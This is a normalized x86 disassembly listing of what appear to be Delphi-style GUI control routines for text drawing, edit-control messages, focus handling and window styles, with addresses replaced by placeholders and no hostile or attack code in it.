cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_448a38
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_424a40
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4042b0
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x160 ]
call sub_424b20
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423918
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x160 ]
call sub_424b20
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_423918
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4042a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ ebx + 0x160 ]
call sub_424b20
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ef11
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_43ef1b
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_43f144
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424200
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_4240e4
xor edx edx
mov eax [ esi + 0x14 ]
call sub_424200
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_42477c
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_40346c
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_40346c
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_43f03c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_424ba0
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_40346c
xor edx edx
mov eax [ edi + 0x160 ]
call sub_424ba0
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_40346c
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_443544
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_43f180
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43f144
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f1e0
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_40346c
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f208
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_445c34
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_43f26c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f2f9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f300
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446764
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45e09c
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_40346c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_43f350
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d80
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_445f20
mov edx 0x19
mov eax esi
call sub_445f44
mov dl 0x1
mov eax esi
call sub_44d288
xor edx edx
mov eax esi
call sub_446928
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_43fa60
mov eax esi
test bl bl
je r-xdata
sub_43f3f8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43f478
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_43f4bc
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_44d358
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_44d054
push eax
call SendMessageA
test eax eax
setne bl
sub_43f4f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44d358
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_44d054
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43f52c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f5a9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f5b0
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_44d358
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_44d054
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x4 ]
call sub_4044a8
mov edx eax
mov eax ebx
call sub_446740
sub_43f5b4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_44d358
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_44d054
push eax
call SendMessageA
sub_43f5f0
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_43f614
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43f634
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_44d054
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_43f664
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_44d054
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_44d054
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43f700
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4466d8
inc eax
call sub_4088cc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f78a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4088e0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4466e8
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408744
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f791
mov eax [ ebp - 0xc ]
call sub_408918
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_43f79c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_4040d8
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_4466d8
inc eax
call sub_4088cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43f82a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4088e0
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4466e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408918
retn
sub_43f838
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_449e0c
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_43f8f1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_44a1dc
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_44a1dc
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_43f964
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_43f9a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44a00c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f9aa
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_43f9aa
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_43f4f4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fa24
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SendMessageA
sub_43fa24
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_43fa60
pop ebx
retn
sub_43fa60
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_42392c
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_445f44
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_43fb2c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_44abcc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_43fb64
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_44d054
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_44d054
push eax
call SendMessageA
sub_43fba4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c66c
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_43fa24
mov eax ebx
call sub_44a5f4
sub_43fbd8
push ebx
mov ebx eax
mov eax ebx
call sub_44c5b0
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43fa60
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_43fc20
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c408
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_44d054
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_43f6e4
sub_43fc5c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44d358
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_40346c
push 0xfffffff0
mov eax esi
call sub_44d054
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_43fc94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_44e154
pop esi
pop ebx
retn
sub_43fcb0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448d4c
mov eax esi
mov edx [ r-xdata ]
call sub_403420
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_43fcd4
push ebx
mov ebx eax
mov eax ebx
call sub_452e20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43fd0c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_43fd62
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
sub_43fd70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d80
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_43fdc4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44db24
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_43fe18
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43fe3c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44aa68
mov eax ebx
mov si 0xffb5
call sub_40346c
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_44d054
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_40346c
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_43feb4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43af70
mov ebx eax
mov eax ebx
call sub_43b050
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44d054
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43b150
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ff00
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43af70
call sub_43b050
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44b4a8
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_43ff2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449ee0
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_43ff64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43fd70
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_445f20
mov edx 0x19
mov eax esi
call sub_445f44
mov dl 0x1
mov eax esi
call sub_44d288
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_43fff0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_44d358
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_44d054
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_44d054
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_440044
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45e10c
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_44790c
sub_440078
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ff2c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_449e0c
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4400e0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_44c4d0
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45e014
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_40346c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40346c
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44014d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4401c6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446764
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45e09c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44c4d8
mov eax ebx
mov si 0xffb8
call sub_40346c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40346c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4401cd
sub_4401d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_44c4e0
pop edi
pop esi
pop ebx
retn
sub_440228
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43af70
call sub_43b050
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_440254
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43af70
mov ebx eax
mov eax ebx
call sub_43b050
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44d054
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43b150
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4402a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43fd70
mov edx 0x61
mov eax esi
call sub_445f20
mov edx 0x11
mov eax esi
call sub_445f44
mov dl 0x1
mov eax esi
call sub_44d288
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_44030c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_40346c
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_440338
mov dl [ eax + 0x212 ]
